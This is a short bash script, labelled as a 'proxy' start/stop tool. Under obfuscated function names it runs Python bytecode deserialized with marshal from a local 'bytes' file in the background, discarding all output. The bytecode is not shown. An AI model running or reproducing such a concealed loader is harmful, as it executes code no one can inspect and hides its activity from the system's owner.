#!/bin/bash

x1() {
    [ ! -f "bytes" ] && echo "[!] Missing file" && exit 1
    pgrep -f "python3 -c import marshal" >/dev/null && echo "[!] Already running" && exit 1
    nohup python3 -c "import marshal;exec(marshal.loads(open('bytes','rb').read()))" >/dev/null 2>&1 &
    echo "[+] Running (PID: $!)"
}

y1() {
    z1=$(pgrep -f "python3 -c import marshal")
    [ -z "$z1" ] && echo "[!] Not running" && exit 1
    kill "$z1"
    echo "[+] Stopped"
}

case "$1" in
    --proxy)
        case "$2" in
            "start") x1 ;;
            "stop") y1 ;;
            *) echo "Usage: --proxy \"start|stop\"" ;;
        esac
        ;;
    *) echo "Usage: --proxy \"start|stop\"" ;;
esac
